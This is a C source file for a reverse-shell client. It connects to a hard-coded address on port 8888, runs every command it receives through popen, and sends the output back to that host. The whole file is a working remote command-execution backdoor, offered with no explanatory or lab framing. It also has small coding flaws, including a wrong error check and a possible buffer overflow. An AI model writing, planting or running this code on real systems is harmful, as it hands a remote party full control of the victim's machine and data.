#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>

#define PORT "8888"
#define HOST "192.168.100.20"
#define MAX 900

int main() {
    struct addrinfo hints, *servinfo, *p;
    int sockfd;
    int status;
    int numbytes;
    char buf[MAX];
    char res_buf[MAX];

    memset(&hints, 0, sizeof(hints));
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_family = AF_UNSPEC;

    if ((status = getaddrinfo(HOST, PORT, &hints, &servinfo)) == -1) {
        fprintf(stderr, "getaddrinfo: %s", gai_strerror(status));
        return 1;
    }

    for (p = servinfo; p != NULL; p = p->ai_next) {
        if ((sockfd = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
            perror("Client: socket");
            continue;
        }
        if (connect(sockfd, p->ai_addr, p->ai_addrlen) == -1) {
            perror("Client: connect");
            close(sockfd);
            continue;
        }
        break;
    }

    printf("Connection successful\n");

    if (p == NULL) {
        fprintf(stderr, "Connection failed!");
        close(sockfd);
        return 2;
    }

    freeaddrinfo(servinfo);

    while (1) {
        if ((numbytes = recv(sockfd, buf, MAX - 1, 0)) == -1) {
            perror("Client: recv");
            close(sockfd);
            exit(1);
        }
        buf[numbytes] = '\0';
        printf("Received: %s\n", buf);

        if ((strcmp(buf, "quit")) == 0 || (strcmp(buf, "exit")) == 0) {
            // Send acknowledgment to the server
            if ((send(sockfd, "Received quit command\n", 22, 0)) == -1) {
                perror("Client: send feedback");
                close(sockfd);
                exit(1);
            }
            sleep(1);
            printf("Sent feedback!\n");
            close(sockfd);
            return 0;
        }

        FILE *fp = popen(buf, "r");
        if (fp == NULL) {
            perror("Client: popen()");
            close(sockfd);
            exit(1);
        }

        while (fgets(res_buf, sizeof(res_buf), fp) != NULL) {
            // Append a newline character to the output
            strcat(res_buf, "\n");
            // Send the output to the server
            if (send(sockfd, res_buf, strlen(res_buf), 0) == -1) {
                perror("Client: send result");
                close(sockfd);
                exit(1);
            }
            sleep(1);
        }
        pclose(fp);

        if ((send(sockfd, "Command executed\n", 17, 0)) == -1) {
            perror("Client: send feedback");
            close(sockfd);
            exit(1);
        }
        sleep(1);
        printf("Sent feedback!\n");
    }

    return 0;
}
